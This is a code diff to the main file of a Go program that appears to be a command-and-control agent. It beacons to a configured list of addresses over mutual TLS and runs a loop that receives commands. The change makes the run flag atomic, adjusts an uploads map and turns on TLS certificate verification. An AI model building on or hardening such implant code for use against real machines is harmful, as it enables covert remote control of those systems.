@@ -5,18 +5,21 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/binary"
-	"github.com/vmihailenco/msgpack/v5"
 	"gopher/functions"
 	"gopher/utils"
 	"net"
+	"net/url"
 	"os"
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"sync/atomic"
 	"time"
+
+	"github.com/vmihailenco/msgpack/v5"
 )
 
-var ACTIVE = true
+var active atomic.Bool
 
 func CreateInfo() ([]byte, []byte) {
 	var (
@@ -78,6 +81,7 @@ var AgentId uint32
 var encKey []byte
 
 func main() {
+	active.Store(true)
 
 	encKey = encProfile[:16]
 	encProfile = encProfile[16:]
@@ -99,12 +103,12 @@ func main() {
 	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
 	initMsg, _ = utils.EncryptData(initMsg, encKey)
 
-	UPLOADS = make(map[string][]byte)
+	UPLOADS = make(map[string]string)
 	DOWNLOADS = make(map[string]utils.Connection)
 	JOBS = make(map[string]utils.Connection)
 
 	addrIndex := 0
-	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
+	for i := 0; i < profile.ConnCount && active.Load(); i++ {
 		if i > 0 {
 			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
 			addrIndex = (addrIndex + 1) % len(profile.Addresses)
@@ -126,10 +130,17 @@ func main() {
 			caCertPool := x509.NewCertPool()
 			caCertPool.AppendCertsFromPEM(profile.CaCert)
 
+			host := profile.Addresses[addrIndex]
+			// Ensure we always set ServerName so TLS verification can run.
+			// If host is an IP, cert must include IP SAN; otherwise use DNS name.
+			if u, perr := url.Parse("scheme://" + host); perr == nil && u.Hostname() != "" {
+				host = u.Hostname()
+			}
+
 			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
+				Certificates: []tls.Certificate{cert},
+				RootCAs:      caCertPool,
+				ServerName:   host,
 			}
 			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)
 
@@ -162,7 +173,7 @@ func main() {
 			sendData   []byte
 		)
 
-		for ACTIVE {
+		for active.Load() {
 			recvData, err = functions.RecvMsg(conn)
 			if err != nil {
 				break
